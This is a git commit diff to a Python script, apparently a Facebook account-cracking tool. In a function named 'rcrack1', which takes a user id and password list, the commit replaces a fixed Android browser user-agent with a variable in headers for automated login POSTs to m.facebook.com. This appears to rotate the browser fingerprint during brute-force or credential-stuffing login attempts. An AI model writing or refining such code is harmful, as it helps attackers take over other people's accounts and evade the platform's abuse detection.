754f3482a9c9f9dd7e0688e95bbcab81c9575aa8
NASA HOCKER <134796377+shaharia420@users.noreply.github.com>
2025-01-06 11:39:53 -0500

    Update RNDM.py

--- RNDM.py
+++ RNDM.py
@@ -257,7 +257,7 @@ def rcrack1(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'user-agent': pro,
     'viewport-width': '980',
 }		    
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
